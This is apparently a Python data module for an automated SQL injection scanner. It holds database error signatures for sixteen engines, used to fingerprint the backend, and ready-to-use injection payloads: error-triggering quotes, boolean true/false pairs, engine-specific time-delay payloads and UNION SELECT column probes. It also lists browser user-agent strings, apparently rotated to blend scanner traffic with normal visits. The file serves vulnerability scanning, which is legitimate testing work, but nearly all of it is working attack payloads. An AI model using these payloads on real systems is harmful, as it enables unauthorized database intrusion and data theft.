ERROR_SIGNATURES = {
    "MySQL": [r"SQL syntax.*MySQL", r"Warning.*mysqli?_',", r"MySQLSyntaxErrorException", r"check the manual that.*MySQL server version", r"Unknown column ['\"]?[^'\"]+['\"]? in ['\"]?field list", r"Pdo[./_\\]Mysql", r"MySqlException", r"com\.mysql\.jdbc"],
    "MariaDB": [r"check the manual that.*MariaDB server version", r"MariaDB", r"Pdo[./_\\]Mysql"],
    "PostgreSQL": [r"PostgreSQL.*ERROR", r"PG::SyntaxError", r"syntax error at or near", r"PSQLException", r"Npgsql\.", r"Pdo[./_\\]Pgsql"],
    "MSSQL": [r"Unclosed quotation mark after the character string", r"\[SQL Server\]", r"ODBC Driver \d+ for SQL Server", r"SqlException", r"SQLServer JDBC Driver", r"Pdo[./_\\](Mssql|SqlSrv)"],
    "Oracle": [r"ORA-\d{5}", r"Oracle error", r"quoted string not properly terminated", r"SQL command not properly ended", r"oracle\.jdbc", r"Pdo[./_\\](Oracle|OCI)"],
    "SQLite": [r"SQLite/JDBCDriver", r"SQLite\.Exception", r"SQLITE_ERROR", r"SQLite error \d+", r"sqlite3\.OperationalError", r"SQLite3::SQLException", r"Pdo[./_\\]Sqlite"],
    "DB2": [r"CLI Driver.*DB2", r"DB2 SQL error", r"SQLCODE.*SQLSTATE", r"com\.ibm\.db2\.jcc", r"DB2Exception"],
    "Firebird": [r"Dynamic SQL Error", r"org\.firebirdsql\.jdbc", r"Pdo[./_\\]Firebird"],
    "Informix": [r"Exception.*Informix", r"Informix ODBC Driver", r"com\.informix\.jdbc", r"IfxException"],
    "Sybase": [r"Sybase message", r"SybSQLException", r"Sybase.*Server message", r"com\.sybase\.jdbc"],
    "HSQLDB": [r"org\.hsqldb\.jdbc", r"Unexpected token.*statement", r"Unexpected end of command"],
    "H2": [r"org\.h2\.jdbc", r"\[42000-\d+\]", r"Syntax error in SQL statement"],
    "Derby": [r"org\.apache\.derby", r"ERROR 42X01"],
    "Presto": [r"com\.facebook\.presto\.jdbc", r"io\.prestosql\.jdbc", r"com\.simba\.presto\.jdbc"],
    "Vertica": [r"/vertica/Parser/scan", r"com\.vertica\.jdbc", r"vertica.*error"],
    "Virtuoso": [r"Virtuoso S0002 Error", r"Virtuoso Driver.*Virtuoso Server"]
}

ERROR_PAYLOADS = ["'123", "''123", "`123", '")123', '"))123', "`)123", "`))123", "'))123", "')123\"123", "[]123", '\"\"123', "'\"123", '\"\'123', "\\123"]

BOOLEAN_PAYLOADS = [
    ("' AND 1=1-- -", "' AND 1=2-- -"),
    ('" AND 1=1-- -', '" AND 1=2-- -'),
    ("' OR 1=1-- -", "' OR 1=2-- -"),
    ('" OR 1=1-- -', '" OR 1=2-- -'),
    (" AND 1=1-- -", " AND 1=2-- -")
]

TIME_PAYLOADS = {
    "MySQL": ["' AND SLEEP({delay})-- -", " AND SLEEP({delay})-- -"],
    "MariaDB": ["' AND SLEEP({delay})-- -"],
    "PostgreSQL": ["' AND pg_sleep({delay})-- -", " AND pg_sleep({delay})-- -"],
    "MSSQL": ["' WAITFOR DELAY '0:0:{delay}'-- -", " WAITFOR DELAY '0:0:{delay}'-- -"],
    "Oracle": ["' AND 1=DBMS_PIPE.RECEIVE_MESSAGE('x',{delay})-- -"],
    "SQLite": [],
    "DB2": ["' AND 1=CAST(RAND() AS INTEGER)-- -"]
}

GENERIC_TIME_PAYLOADS = ["' AND SLEEP({delay})-- -", "' AND pg_sleep({delay})-- -", "' WAITFOR DELAY '0:0:{delay}'-- -"]

UNION_PAYLOADS = [
    "' UNION ALL SELECT NULL-- -",
    "' UNION ALL SELECT NULL,NULL-- -",
    "' UNION ALL SELECT NULL,NULL,NULL-- -",
    " UNION ALL SELECT NULL-- -",
    " UNION ALL SELECT NULL,NULL-- -"
]

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/131.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 Chrome/131.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/131.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:133.0) Gecko/20100101 Firefox/133.0"
]
